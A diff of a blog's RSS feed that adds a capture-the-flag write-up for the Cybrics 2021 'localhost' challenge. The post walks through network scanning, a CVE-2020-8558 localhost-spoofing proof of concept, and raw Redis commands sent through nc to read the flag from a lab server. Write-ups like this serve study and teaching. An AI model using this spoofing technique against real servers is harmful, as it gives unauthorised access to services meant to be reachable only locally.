@@ -5,9 +5,169 @@
         <description>Stdor's blog</description>
         <link>https://tlyrs7314.github.io/</link>
         <atom:link href="https://tlyrs7314.github.io/feed.xml" rel="self" type="application/rss+xml"/>
-        <pubDate>Thu, 13 May 2021 16:48:47 +0800</pubDate>
-        <lastBuildDate>Thu, 13 May 2021 16:48:47 +0800</lastBuildDate>
+        <pubDate>Mon, 26 Jul 2021 11:41:13 +0800</pubDate>
+        <lastBuildDate>Mon, 26 Jul 2021 11:41:13 +0800</lastBuildDate>
         <generator>Jekyll v3.9.0</generator>
+        
+            <item>
+                <title>Cybrics CTF 2021: localhost (267pts, 20 solves)</title>
+                <description>&lt;p&gt;Most of the CTF web challenges work on the Application layer. This is the first time I have encountered one that works on the Network layer. It’s quite an inspiring challenge.&lt;/p&gt;
+
+&lt;!--more--&gt;
+
+&lt;h1 id=&quot;the-challenge&quot;&gt;The challenge&lt;/h1&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Author: Vlad Roskov (&lt;a href=&quot;https://t.me/mrvos&quot;&gt;@mrvos&lt;/a&gt;)&lt;/p&gt;
+
+  &lt;p&gt;Remember NET fleeks? I’ve pwned a box in another corporate network,  and there is some peculiarly configured server near my foothold. Take a  look.&lt;/p&gt;
+
+  &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh localhost@109.233.61.10
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;  &lt;/div&gt;
+&lt;/blockquote&gt;
+
+&lt;h1 id=&quot;writeup&quot;&gt;Writeup&lt;/h1&gt;
+
+&lt;p&gt;According to the description, we should first find the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;peculiarly configured server&lt;/code&gt;. It was kind of the author to include &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; for us.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@PWNED:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hostname&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt;
+10.193.162.7
+
+root@PWNED:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sn&lt;/span&gt; 10.193.162.7/24
+Starting Nmap 7.70 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-07-25 08:22 UTC
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.193.162.1
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00013s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+MAC Address: 02:42:E1:C9:F5:39 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Unknown&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;lh_tgt_418.lh_418 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.193.162.180&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.000050s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+MAC Address: 02:42:0A:C1:A2:B4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Unknown&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;PWNED &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.193.162.7&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Host is up.
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 256 IP addresses &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3 hosts up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;3.87 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So we go on to scan &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.193.162.180&lt;/code&gt;. The only listening service is HTTP running on port &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;80&lt;/code&gt;. Some config files are hosted there:&lt;/p&gt;
+
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@PWNED:~$ curl 10.193.162.180
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;Storage Node Status Page&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;table&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;border=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&lt;/span&gt;Records&lt;span class=&quot;nt&quot;&gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&lt;/span&gt;1&lt;span class=&quot;nt&quot;&gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&lt;/span&gt;Flag-containing Records&lt;span class=&quot;nt&quot;&gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&lt;/span&gt;1&lt;span class=&quot;nt&quot;&gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&lt;/span&gt;Redis Configuration&lt;span class=&quot;nt&quot;&gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&lt;/span&gt;Default: &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;redis.conf&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;redis.conf&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&lt;/span&gt;System Configuration&lt;span class=&quot;nt&quot;&gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;sysctl.conf&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;sysctl.conf&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&lt;/span&gt;Security&lt;span class=&quot;nt&quot;&gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&lt;/span&gt;perfect!&lt;span class=&quot;nt&quot;&gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/table&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;ul&gt;
+  &lt;li&gt;Filtered content for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://10.193.162.180/redis.conf&lt;/code&gt;:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;bind &lt;/span&gt;127.0.0.1
+protected-mode &lt;span class=&quot;nb&quot;&gt;yes
+&lt;/span&gt;port 6379
+tcp-backlog 511
+&lt;span class=&quot;nb&quot;&gt;timeout &lt;/span&gt;0
+tcp-keepalive 300
+daemonize &lt;span class=&quot;nb&quot;&gt;yes
+&lt;/span&gt;supervised no
+pidfile /var/run/redis/redis-server.pid
+loglevel notice
+logfile /var/log/redis/redis-server.log
+databases 16
+save 900 1
+save 300 10
+save 60 10000
+stop-writes-on-bgsave-error &lt;span class=&quot;nb&quot;&gt;yes
+&lt;/span&gt;rdbcompression &lt;span class=&quot;nb&quot;&gt;yes
+&lt;/span&gt;rdbchecksum &lt;span class=&quot;nb&quot;&gt;yes
+&lt;/span&gt;dbfilename dump.rdb
+&lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; /var/lib/redis
+slave-serve-stale-data &lt;span class=&quot;nb&quot;&gt;yes
+&lt;/span&gt;slave-read-only &lt;span class=&quot;nb&quot;&gt;yes
+&lt;/span&gt;repl-diskless-sync no
+repl-diskless-sync-delay 5
+repl-disable-tcp-nodelay no
+slave-priority 100
+appendonly no
+appendfilename &lt;span class=&quot;s2&quot;&gt;&quot;appendonly.aof&quot;&lt;/span&gt;
+appendfsync everysec
+no-appendfsync-on-rewrite no
+auto-aof-rewrite-percentage 100
+auto-aof-rewrite-min-size 64mb
+aof-load-truncated &lt;span class=&quot;nb&quot;&gt;yes
+&lt;/span&gt;lua-time-limit 5000
+slowlog-log-slower-than 10000
+slowlog-max-len 128
+latency-monitor-threshold 0
+notify-keyspace-events &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;
+hash-max-ziplist-entries 512
+hash-max-ziplist-value 64
+list-max-ziplist-size &lt;span class=&quot;nt&quot;&gt;-2&lt;/span&gt;
+list-compress-depth 0
+set-max-intset-entries 512
+zset-max-ziplist-entries 128
+zset-max-ziplist-value 64
+hll-sparse-max-bytes 3000
+activerehashing &lt;span class=&quot;nb&quot;&gt;yes
+&lt;/span&gt;client-output-buffer-limit normal 0 0 0
+client-output-buffer-limit slave 256mb 64mb 60
+client-output-buffer-limit pubsub 32mb 8mb 60
+hz 10
+aof-rewrite-incremental-fsync &lt;span class=&quot;nb&quot;&gt;yes&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Filtered content for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://10.193.162.180/sysctl.conf&lt;/code&gt;:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;net.ipv4.conf.all.route_localnet&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;By &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;redis.conf&lt;/code&gt; I assume that a redis instance (used for data storage)  is running on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.193.162.180:6397&lt;/code&gt;, but is only accessible locally because of the first line &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bind 127.0.0.1&lt;/code&gt;. So our goal is to connect to it from the local side. That sounds SSRF-ish, but how do we do that without any proxy or \(``\)admin visit\(&quot;\) services?&lt;/p&gt;
+
+&lt;p&gt;Upon searching the config in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sysctl.conf&lt;/code&gt;, I stumbled on &lt;a href=&quot;https://github.com/tabbysable/POC-2020-8558&quot;&gt;this detailed article&lt;/a&gt;, which suggests that we could pretend to be coming from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;127.0.0.1&lt;/code&gt; by altering IP packets directly. This does not work all the time, but it is possible in this scenario thanks to the configuration in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sysctl.conf&lt;/code&gt;. I then used the testing and PoC scripts provided by the author. Basically, the script captures the traffic sent to a fake address you’ve specified, modifies it and send the payload to the victim server.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 poc.py &lt;span class=&quot;nt&quot;&gt;--fakedestination&lt;/span&gt; 10.193.162.1 10.193.162.180 &amp;amp;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Normally you would want to use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;redis-cli&lt;/code&gt; to connect to redis. But since the protocol can be handcrafted easily, I just used &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc&lt;/code&gt; for this.&lt;/p&gt;
+
+&lt;p&gt;Command: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KEYS *&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@PWNED:~/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'*2\r\n$4\r\nKEYS\r\n$1\r\n*\r\n'&lt;/span&gt; | nc 10.193.162.1 6379
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;1
+&lt;span class=&quot;nv&quot;&gt;$33&lt;/span&gt;
+flag_is_here_iedie8Ee5eniequ4uNie
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Command: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GET flag_is_here_iedie8Ee5eniequ4uNie&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@PWNED:~/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'*2\r\n$3\r\nGET\r\n$33\r\nflag_is_here_iedie8Ee5eniequ4uNie\r\n*\r\n'&lt;/span&gt; | nc 10.193.162.1 6379
+&lt;span class=&quot;nv&quot;&gt;$61&lt;/span&gt;
+cybrics&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;m05T_C0mm0N_s3CuR1tY_m34SuRe_4nD_L34St_c0MmoN_sysctl&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;flag: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cybrics{m05T_C0mm0N_s3CuR1tY_m34SuRe_4nD_L34St_c0MmoN_sysctl}&lt;/code&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;references&quot;&gt;References&lt;/h1&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/tabbysable/POC-2020-8558&quot;&gt;https://github.com/tabbysable/POC-2020-8558&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.compose.com/articles/how-to-talk-raw-redis/&quot;&gt;https://www.compose.com/articles/how-to-talk-raw-redis/&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;
+</description>
+                <pubDate>Mon, 26 Jul 2021 00:00:00 +0800</pubDate>
+                <link>https://tlyrs7314.github.io/2021/07/26/CybricsCTF2021-localhost.html</link>
+                <guid isPermaLink="true">https://tlyrs7314.github.io/2021/07/26/CybricsCTF2021-localhost.html</guid>
+                
+                <category>ctf</category>
+                
+                <category>ctf-writeups</category>
+                
+                <category>ctf-web</category>
+                
+                
+            </item>
         
             <item>
                 <title>The logic behind matrix diagonalization with eigenvectors</title>
